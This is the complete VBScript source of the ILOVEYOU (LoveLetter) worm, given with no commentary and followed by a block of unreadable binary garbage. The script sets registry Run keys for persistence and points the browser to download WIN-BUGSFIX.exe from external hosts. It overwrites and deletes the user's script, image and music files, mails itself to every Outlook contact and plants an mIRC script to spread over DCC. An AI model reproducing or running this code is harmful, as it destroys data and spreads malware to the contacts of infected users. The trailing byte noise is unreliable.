rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                           @+‰H„T‘šÅ³a ( ƒ#“»j˜èD,A£zˆD"BHƒT;ô¥j1øÅi¬Ici@— š¶ûªx.4
½„9•` #Œ±˜&-(#_#•Q«¥Õ€ngeYì(FŠ9pÑ‹Hó,Q_&HŒÁ* M½ªE\ºT†"3¢(16Ösˆ@•Cw‰ydˆÃ¨²Tï“I‘¬«gk
±‰,§µÇ‡šØ…*ÎE-ÙJ“ÊvÕ{(n<¤)Å…K2JÅÿöE¢”ÉM[J" É¥’€,ÊÓ!eš£H>phál¨±Ó¢“E ÎQ¨n~_°ĞÒ°yìáÈƒ¢¢n B€ ‹	K–˜ª>	´Dtï6@0NÑTM”ğ“£%¸M*Ñ“cy p„@W„ñ­§ˆ2-…¡ƒÔ›P‡dÏ§¤ å²•"’€h¦©“ß.³
Ö}˜uNœ“åÉ’çA2‰˜S­rªµÂfBª«T’#PabpizH"­k¨¤+$(Ñx/H5¶f,b(\ld¿Á|IÍJÕ&İ0|ÒÈ®…`)NqAâù8r2‚åæ×`D¡XSFnYv-$—PñdQJÙU¡­ôÁØÕ9a2¨„¡^áÀİ!è-ƒ”ãÀ¶ªúA>“5øÅK,CÑÌÚn\uÈ¤°©ãÜ%,©ËS¯(Ãqù¢0\¦7X[¹HE7áĞÑù`X’dU%%’UoÖ/U‹¬p(”HÖ#5jÔš"YÄayŠ<ª2è p <,1½¦^Š±JİB€Ò-„-Ñ‡ÒË3S¢å¤9Æ;f†üïUd‘Ò(‰”ƒp¸IE¥"¦#<„0Á>/ŸÉïHÍ@W,ëœ{¡¥¦¦]yyZ0+†‚0â3T*•">¤ÅÑOiGÅÕš·¨–Kñ‰<<ãß^ÿ&¦¥!6oó†ÓBi1ššx{~OZ
fÇoÏæñã=Ì~<ŒmÏï÷ÛÌöøml'<ÆÃ¶Áfğcl°¶mc3ÛoÛölûgÛ±mlÛ¶ßÆ~Û¶mllÛÆ°m°mÛÆÆ¶mÛ¶mcÛÆ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mlÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛöcÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛ¶mÛvÛ¶mÛ¶±mÛ¶mÛ6´Û¶»Ûn»mÛ6n=¶mÛmÛmclŒİ6vãn»qÛĞ¶M7»ÛØmãî8ín‡v·i§Cwã¶Cwl·İt·»mŒÓnÒ¦±étºmpÚİqÄ4¥)1é†n;Ä*@II‘¸I¤)¨C"¤â&İ-i«)ÄiRd€4¨*XVcˆC+!U±£Æi R5%ËâÖ4ŒiÅ_B"Viœ¦T7‚<C³ª)	B„’>‚û
#¡¤’Â!êƒ0C„uÕ¨E)#µdBÄ†#¢A'Øa"ƒ 9+H ¢êfD5eWÃ\œ&EcB(£xRA*!)J:ÄbÄ2"*,E×F%)‰ 8R‰XIÖ ¤EoSH$t5Wd@Ù‘¾†(ªH†HH“£RLJŒŒ¡I0!3ˆ1a¥DƒÄ¢F@Î  @2f/*O35NËbGhÌuPBTDgdjˆƒ ĞerL5Éˆ·Ø¨PœAÉ@C1$aR¦#$C„)'dc$(Š!èHÂÀY‡Œê¤’  Na‰À¨»¹Ş`ËF®“ƒc‡hgñÇ
–¤+¥V´¢ ¦‘h†z#Hr©D¡DHLO@1ˆt‡@2HKmÍeÅ#Q‰¥T0Ñ  ,)¦DDˆQu	Lù$T,†@¶L	:“]¯Ñ
¥)€Tâ”Z¾	'*‰)Äà=ƒ)ÈÀ\x˜ŒD"˜^Ğ·8Ó yÈE¸ (öQPp—ÉFÁ	í×NQ4d«FÌ™6¦î“U=ÒÆ  éşº9uNå fôÂH&`,L*.abZ:E *3ÔD£}òÎ0õIq(®ˆÂ¸Œ®ÁSrX°…B…^´ŒF‰-'É`P>Sˆ$¨Îœa—‘ÌĞm"¢ÆER0`
nã±ìUQèù6 :×¸¥ ]Uqh‰»…üq ˆ"ÃşŒ‚>N^œÇ!4P®Û0ê-x  £ÇI¹Z">ÄÂ
ß‘£
›!‡!qÅ8‡)¡¹ğ@=ÀÔi*&ëœOšb%$ENDÌNÌŒQƒa`€‰ˆ} ]ÁÈ1Ş	{•èŒ™òEæ‰ÌH‡U             @                      @                      @           ì   <  =hù °ÃõğàÈ¼°¬¨¤””„€tl`TPP„„bœ¦L‚eR œ‰¢#D	‚iq¦i¦c§ÑÊÓÃÙ²Â»±²ÉãéôºÑÓğIÓÁëïUPdåUàHÇ4»âø›FebZô%³F
9Ô m”rôÂÂ”è•!O[é½BÇ;mĞöJ€î¨MA}AÕa£‰©ÉŞÇg/Š‚flÁÒLçÄ‘Î:;ÕQJ;ä	»ìIãTÃ«j—|U¯eRÿPa ÆÇÎtVà†/ª´öy­?5ª'Lºe
^ÑU&ÚbH&Ñ—ÑFãÓ %âEğsß		uœåmš¡‰ä;Ú°w¡k	Œ=pI¸PCô47”5tÅ„„›»¾|¤&ŒºAšÀ>íFôÀk»ÇwVTìò%TRMCÖ6İ-èòé!up‚V˜ÕÓ°¸M §©š©ÎÖƒ:¦âlĞ#\ªı]üÏx•¡8 š|‡ySr„CZÌW—)¡EepY¯"ëUîX·óØ’1¡›²³õÊ­ámòpIg
'°¶di¹¦İ¹¼I\mG óì)~BWd:áƒ¹à•4–KÆ8uaÒ¥]ÜÆ‰ZÌQwœ[•½ƒÕ¼SÙ´QZ­¸³±ÊB“R¤öhvV“NæZ(EÑ[ëùÿ¡d¼´W_¨ÉµfS~…‡§Ó0³+7ŸV*{/ÁÅ.ò+ÀªQuk“æg†+¥ElRªİ›û•S~m×]åé™-ÇLf±[€*¼-ïÖ6í`Ë«”kX$•è%ŠŸÚPj¯éLÆökŞj¾æI•jƒ`àÛ+ÏõÅŞÄÉÚ¤E™tÓÖÄW;¸K8eW–O[•U¹ÍÍ[~c5µOÚuM¿¼åÆÑ?µÿtÅ½O»ÄO{½U<„UİCû¬Å9œEÌiŒº$;ÊªK®ê:ºe¶+İ¶âŒÆ¨lº¬m¾äº¾m¬ÖêËÒjlÆ¤l¾¥œÂ§[¾'[ÖiœÒ*ÌÒflÆãœâã­²)^Ê¨œºè<ÆbœºèŒ®ª¬¶$¬¾j,¶,«Ê®LÒèLŞ%«º©KÎ'M¾pkÂè¬Êè[
mQÖËWeÉyUM}QveË8mË÷TSºK_×5®ëº­ë¶®ëº®ëº®k»®Ûº­ëºµëº®ëºµëº­ëº®ë¶®Û·u]×uİ¶u[×m]×mİÖu[×u]×m]×u]×uİ¶u]×u]×u[×u]×uİÖmİÖuİÖm¤nëº­ëZüÿ'©Û¶mëºmÛº­Û¶­Û¶nÛºÿÿ¤­Û6Åÿÿÿÿÿÿÿÿÿÿÿ¿øÿ'uÛ¶?şÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿüÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿşÿ¿ÿÿÿÿÿÿÿÿÿÿı~Ûoÿûıïÿ¿ı~Ûşÿ·ÿßşÿ¿íÿ·í¿mÛoûmûßoûmÛ~[ÿmÛ¶mÛşÛ¶ß¶mÛ¶mÛ¶mÿÛ¶mûmÛöÛ¶mÛ¶mÛ¶mÛ¶ÿí·mÛ¶mÛ¶m¿mÅ¶mÛ¶mÛ¶mÛ¶m[RLiK1#~¿mÛ¶ ÅiÛRÜ2bÛ¶Û~išb ¸Å”RŠi‹Øn¤-Æ„Ø~Û?ÆiÄÎ*BœRšâ´Åi[
††Ø£ıß‘.)LcJ	sÜP ÄŞ;s¤8%·ãˆc÷àÆ˜Šëp
¡[Ú¼¸!à˜QŞÔ1MpLT1PµN™¶¦n°›Æ5)a¦T†¼ğ8­ãqšöyÉKÛP~ˆº†¼¶I>°ÜÖn]“ª,¤‚wÀ#e
n&%Á¢Ã¡¡Ò8ÆÇnJMdBÁIBÉ¬0À†ò*D‘*DØjš†ÄŒF–Êng¤ ²4¡)“¹4â™	İH$ŠC  ,Ü™@V’ùLµ…›4+ÁÏ½EÙ“1Æl‹ÕÄ
49´XTİR%s†	•Ağ°2‹v (c5T<¦¤‰O®D (Î`VWy¦"QÄœ‡êGÊHË D™qd:Kˆˆx’
£¡±š¤˜h >hÈM_SfIÀqá¡à2ÂAbÛyÆ ©<Ğ‰1Í¨j©q)Ãòœí…°	0É€€Ó*ñ.’WBeâ°8å ‰d¤ŞzcÆ–"%¤P¬èT ¡ qÆ…aA© îÄ ócÄ)¢`U‘ü$…CÄ¦T1;Œ–˜²h©·(ÙéFè|ó‡9ÅÅ¤€£0ÜîÍCã§HãP(¤4D¬\ÅFY²“B,¼1ÑÅà,+¬gT#3K)¤.*²ØYpæ‡€Ä@¦v#ŸJĞ·ÂZW@Â³0X{J,„»™|ƒ¼àñÇE„“FõôiCÂvp#y£#\r€IŞ[#H'AÁØr¡r¸+¿Z¡…€BŸÀ
  ü®İ!h ıôìÔÄ¸¬¤  ŒŒ€|ldXPHL||8‘rÍë˜ÎÌÌ@rdd¤eC‘IZxí4ÊHd¨n*/…P¹>V6;5ºÁc‡DOĞÙtäfï#AëĞÔƒS±"Ğyì	ÌÔÚ0KÈÑMlªxè ©œ5ÔpE°xÎ€ÃŒrÚ0™bÒeK½Pd:ï
h”=	ÊLÚAZŠãœµÊlí”IfŒa6Ó=UµÁ(Î¨«¼“E¢8ˆ©„¢e‚“øa“ÓeDùê E˜€¨„Ú€'µ—F;±™Í–F1R 3æRÌ€ŒUmQ¨:hé¼åüÆŒÆâÎˆ|ní«Æ3€IÑÔÑ’Ûª‰ŸåçW…Ë*ÖènÄ3ÔrÂ"P8°yÈ^í!áx2I‹c¶èÆ=ƒÆsïK¿Œ÷‚šşU¹ÍS7&Óúİ‹•¦co®ŠÑÄKMæÄ›¢'KÌC‹ò?U×ØUÁ¢%€‰	+0XSGA+iµşg‰'(´Š,Òšf#Áé_øV¤Œš‚Ùšğ¼Ø":œ£YÆ‰†‚lÀ4Q`&8móµ½EwpQ9 rXÕwmƒœXá–ˆ‡Y+´øWŸ‚áôEÀŠóX§jêš­h‹k îé¦ø B¸‹õ€Š5[¾µ]lîE†ç¼¬§Z¡.éQmåå.Y8gFÛs~[“døLã•}í”-á U{¾¬:ÚªÌRK^+EƒÓ”UøäM{@cW€E••C<Pg™|OU”EŞ,ÔZ0ÙÃv˜ÁLº$;®¬~Ê„¾¯YŞ!,Àa™¥;¾§{ÂŞ´=k>Õ€EMò>ÄùÅQŸnªÌĞc—xåÓÇ2öµË.ïÄÓ+4QÖ<áB•Ë;wå´Kw Së·íôÛ?8½*4MtŒÇÑKñä’+1-QóãGrƒŸ7Úy£†ks´RÛ§Õ[-1ÅsS»Ìs_.uÔrS/­UOtÅ2_=9İÓË­™ïÎï?$±´õÒó¼öf<­ÔO-5ÅóÒL÷Ô2ß+şÿ´5nkL[J[Ü¶˜Ö¸¥ÂÿO(¦tÄÿÛï÷ÛA(Å”Ö”°í·ış'5¦mûíÿ'´Åí¿ßoûıÿ~¿ßÿÿöûíÿ¿ßşûß¶mÿûÿıöûßÿ~ÿ¿íÿ·ı¶ı¶ßoûÿı¶ı¶ß¶mûm¿ı¶í·ßÿoÛï·mÿÛ~ûıï·íÛ¶ı¶mÛ¶ß¶ÿßÿo¿ıÿoÛï÷ûmÿûmÛÿ~Ûo¿ışaÛ¶ß¶mûı~Ûo¿ı¶ßöÛo¿mÛöÿÛ~Ûÿo¿ÿı¶mÛoÛoÛoÛ¶í·ÿıÿ¶mÛÿÿÿ¶ı¶mÛ¶mûßoÛ¶í·mÛ¶mûmûıÿ¶mÿÛöûı~Û¶íÛ¶í·í÷¿m¿ıæíÿ÷ûí·ı?Ş~ûmÛÿÿ¶ı¶ß6oÛfölÛÿo›ÿÿÛşşı?ûmì7³±ßàçßğfÿŞxÿÿ¿·á7{Ï<oc¿¶ãÍŞÌöÀxìm›7ÏŒ{Şlûçm?{<~ßgã7~cFó~ãÙÿÀæ?fş½‡Áo¶÷°½Æf¿106Ì33fıö¿·v`æÏ›?X<ïçùÇ‚iÓ“¢y70şÉıÆä©…ÿî³!ĞÒXì‹ ÇÅ‡¶ˆúAÚ7¦!ümÀMBi½"BêÖ˜–ªiÁI[0q!mÓ¸m´EØ©(¯Ò:-¸mZ0•hUì61QE§ğ¡æ¸<5÷µ#æmŒÛ‹´Pö^b'(MÃ¨¦b6	pã*©ëvŒ(0­4È,İ	Ñ%iÛrDh¯&-£*‘‰]–Hí rØIR)‚‰R,8gÕ6·4 ‚b"…k"IÑ-F•1HÉZÍWÉª
9‡ìÈQKˆnéæÈE­Z>~ë$È@,àaxªSD
EÅ$QHDC‘ÅCÅ:¦]d+QÔÂL`ö ÈK¢!@@ÂœtFUÈ&…šd±-½×Ïïs$Ò*®SUL2¦£<”l8%0…ƒjM¡è¥*Qjæˆ	=s¼A‡*BS<Hg("wÑ>Å¬Å±šn,Ê&NÆ=©æŸ*RsQæÉ²³ÙÕ—ÜE1B#ª:¬lXšd|4DL¢